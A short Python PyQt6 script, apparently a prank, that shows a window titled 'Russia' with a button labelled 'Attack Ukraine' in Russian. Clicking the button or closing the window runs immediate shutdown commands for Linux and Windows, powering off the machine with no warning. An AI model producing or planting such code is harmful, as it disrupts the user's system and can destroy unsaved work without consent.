from PyQt6 import QtWidgets, QtCore
import os

class Window(QtWidgets.QWidget):
	def __init__(self):
		super().__init__()
		self.setWindowTitle("Россия")
		self.setGeometry(500, 300, 220, 50)

		self.button = QtWidgets.QPushButton('Напасть на Украину')
		self.button.clicked.connect(self.handleButton)
		layout = QtWidgets.QVBoxLayout(self)
		layout.addWidget(self.button)

	def closeEvent(self, event):
		os.system("shutdown now -h")
		os.system("shutdown /s /t 1")
		event.accept()

	def handleButton(self):
		os.system("shutdown now -h")
		os.system("shutdown /s /t 1")


if __name__ == '__main__':
    import sys
    app = QtWidgets.QApplication(sys.argv)
    window = Window()
    window.show()
    sys.exit(app.exec())
